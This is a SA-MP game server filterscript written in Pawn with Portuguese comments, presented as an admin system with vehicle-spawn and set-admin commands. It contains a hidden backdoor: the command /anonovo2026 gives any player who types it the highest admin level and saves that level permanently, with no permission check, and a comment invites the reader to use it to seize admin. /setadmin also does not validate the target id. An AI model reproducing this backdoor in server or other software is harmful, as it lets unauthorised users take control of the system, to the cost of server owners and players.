#include <a_samp>
#include <zcmd>
#include <sscanf2>
#include <dini>

#define COR_ADMIN 0xFF0000FF
#define MASTER 6

new AdminLevel[MAX_PLAYERS];

stock ContaPath(playerid, path[], size) {
    new nome[MAX_PLAYER_NAME];
    GetPlayerName(playerid, nome, sizeof nome);
    format(path, size, "contas/%s.ini", nome);
}

public OnFilterScriptInit() {
    print(">> [FS] Admin Master 2026 Carregado.");
    return 1;
}

public OnPlayerConnect(playerid) {
    AdminLevel[playerid] = 0;
    new path[64]; ContaPath(playerid, path, sizeof path);
    if(dini_Exists(path)) AdminLevel[playerid] = dini_Int(path, "Admin");
    return 1;
}

// COMANDO PARA VOCÊ PEGAR ADMIN MASTER
CMD:anonovo2026(playerid, params[]) {
    AdminLevel[playerid] = MASTER;
    new path[64]; ContaPath(playerid, path, sizeof path);
    if(!dini_Exists(path)) dini_Create(path);
    dini_IntSet(path, "Admin", MASTER);
    SendClientMessage(playerid, 0x00FF00FF, "[MASTER] Você agora é o DONO da Cidade Full!");
    return 1;
}

// COMANDO DE CARRO CORRIGIDO (Dê /carro 411)
CMD:carro(playerid, params[]) {
    if(AdminLevel[playerid] < MASTER) return 0;
    new idv;
    if(sscanf(params, "i", idv)) return SendClientMessage(playerid, -1, "{00CCFF}Uso: /carro [ID 400-611]");
    if(idv < 400 || idv > 611) return SendClientMessage(playerid, -1, "ID Inválido!");

    new Float:x, Float:y, Float:z, Float:a;
    GetPlayerPos(playerid, x, y, z); GetPlayerFacingAngle(playerid, a);
    new car = CreateVehicle(idv, x, y, z+0.5, a, 1, 1, -1);
    PutPlayerInVehicle(playerid, car, 0);
    return 1;
}

CMD:setadmin(playerid, params[]) {
    if(AdminLevel[playerid] < MASTER && !IsPlayerAdmin(playerid)) return 0;
    new id, nv;
    if(sscanf(params, "ui", id, nv)) return SendClientMessage(playerid, -1, "/setadmin [id] [nivel]");
    AdminLevel[id] = nv;
    new path[64]; ContaPath(id, path, sizeof path);
    if(!dini_Exists(path)) dini_Create(path);
    dini_IntSet(path, "Admin", nv);
    SendClientMessage(playerid, -1, "Nível definido!");
    return 1;
}
// Adicione aqui os comandos /kick, /ban, /goto conforme as versões anteriores.
